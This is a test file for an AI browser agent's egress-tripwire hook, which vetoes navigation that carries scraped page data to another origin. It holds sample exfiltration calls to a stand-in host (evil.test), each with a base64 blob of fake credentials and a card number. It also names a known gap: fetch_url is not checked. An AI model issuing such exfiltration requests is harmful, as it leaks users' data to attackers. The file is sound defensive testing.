// security-arc issue 243, the WIRING half: the egress tripwire as a registered
// DEFAULT pre-tool-use hook.
//
// The judgement is pure and exhaustively tested next door
// (tests/peerd-runtime/tools/egress-heuristics.test.ts). What is NOT covered
// there, and is covered here, is the wiring that decides whether that judgement
// ever runs:
//   - it runs at the pre-tool-use event, AFTER the confirmation, which is the
//     whole reason it is a hook and not a gate
//   - it is scoped to primitive:'tab' — the browser-session calls egress-allowlist
//     exempts on purpose, and which no network-layer check ever sees. Not the
//     allowlist's whole exemption (it also skips non-mutate_external calls, and
//     fetch_url falls in that gap); the pair tiles most of the surface, not all.
//   - a block travels back through the real runner as a veto
//
// why it imports the hook FILE and not defaults/index.js: that barrel also pulls
// egress-allowlist, which reaches /peerd-egress and the browser polyfill — no
// chrome.* under Bun. The one claim this file therefore cannot make, that the
// hook is actually IN DEFAULT_HOOKS, is asserted in the in-browser suite
// (extension/tests/unit/peerd-runtime/default-hooks.test.js), where the barrel
// loads for real.

import { describe, test, expect } from 'bun:test';
import { runPreToolUse } from '../../../extension/peerd-runtime/tools/hooks/runner.js';
import { egressTripwireHook } from '../../../extension/peerd-runtime/tools/hooks/defaults/egress-tripwire.js';

// A scraped-looking blob: long, high-entropy, base64-shaped — the payload half
// of the exfil shape the inspector looks for.
const BLOB = 'eyJlbWFpbCI6ImFsaWNlQGV4YW1wbGUuY29tIiwidG9rZW4iOiJza19saXZlXzRlQzM5SHFMeWpXRGFyakwifQ'
  + 'eyJhZGRyZXNzIjoiMTIzIE1haW4gU3RyZWV0IiwiY2FyZCI6IjQyNDIgNDI0MiA0MjQyIDQyNDIifQ';

const ctxFor = (origin: string | null, primitive = 'tab') => ({
  activeTab: origin === null ? undefined : { id: 1, origin, url: `${origin}/page` },
  getToolMeta: () => (primitive === null ? undefined : { primitive }),
});

// The REAL runner, with the real hook — the same call the dispatcher's pre-hook
// phase makes. `allowed:false` is the veto the dispatcher turns into a block.
const runHooks = (toolName: string, args: any, ctx: any) =>
  runPreToolUse({ hooks: [egressTripwireHook] as any, toolName, args, ctx: ctx as any });

describe('egress tripwire — declaration', () => {
  test('it is a pre-tool-use hook — the last veto, after the human confirm', () => {
    // Gates run before the async confirmation; pre-tool-use hooks run after it.
    // That ordering IS the design: summarizeCall truncates args to 40 chars, so
    // a user who clicked "yes" on a `navigate` never saw the blob.
    expect(egressTripwireHook.event).toBe('pre-tool-use');
    expect(egressTripwireHook.match).toBe('*');
  });

  test('it runs after the allowlist (order 10), so the hard floor reports first', () => {
    expect(egressTripwireHook.order).toBeGreaterThan(10);
  });

  test('its description says what it does NOT guarantee', () => {
    // Rendered verbatim in Context → Hooks. A user must not read a best-effort
    // tripwire as a wall.
    expect(egressTripwireHook.description).toContain('not a guarantee');
  });
});

describe('egress tripwire — scope', () => {
  test('a non-tab tool is skipped outright', async () => {
    const r = await runHooks('fetch_url', { url: `https://evil.test/${BLOB}` }, ctxFor('https://mail.test', 'web'));
    expect(r.allowed).toBe(true);
    expect(r.outcomes[0].reason).toContain('not a browser-session tool');
    // Pinning the CURRENT scope, not endorsing it: fetch_url is a real gap
    // (the allowlist skips it too — it is not mutate_external). If a later
    // change widens the tripwire to primitive:'web', this test SHOULD fail and
    // be updated, rather than standing as evidence the gap was intended.
  });

  test('an unknown tool (no meta) is skipped rather than guessed at', async () => {
    const ctx: any = ctxFor('https://mail.test');
    ctx.getToolMeta = () => undefined;
    const r = await runHooks('mystery', { url: `https://evil.test/${BLOB}` }, ctx);
    expect(r.allowed).toBe(true);
  });
});

describe('egress tripwire — the veto it exists for', () => {
  test('navigating off-origin with a scraped payload in the path is BLOCKED', async () => {
    const r = await runHooks('navigate', { url: `https://evil.test/${BLOB}` }, ctxFor('https://mail.test'));
    expect(r.allowed).toBe(false);
  });

  test('an ordinary off-origin navigation is allowed', async () => {
    // The false-positive guard. A tripwire that fires on ordinary browsing is
    // one that gets ripped out.
    const r = await runHooks('navigate', { url: 'https://news.test/2026/07/an-article-about-things' }, ctxFor('https://mail.test'));
    expect(r.allowed).toBe(true);
  });

  test('a SAME-origin URL carrying the same blob is allowed', async () => {
    // Nothing left the machine. Staying on the origin the bytes came from is
    // not exfiltration.
    const r = await runHooks('navigate', { url: `https://mail.test/${BLOB}` }, ctxFor('https://mail.test'));
    expect(r.allowed).toBe(true);
  });

  test('with NO page loaded there is nothing scraped, so it allows', async () => {
    const r = await runHooks('navigate', { url: `https://evil.test/${BLOB}` }, ctxFor(null));
    expect(r.allowed).toBe(true);
  });

  test('a garbage arg never throws — a broken tripwire must not break dispatch', async () => {
    const r = await runHooks('navigate', { url: { nested: [1, 2, 3] } }, ctxFor('https://mail.test'));
    expect(typeof r.allowed).toBe('boolean');
  });
});
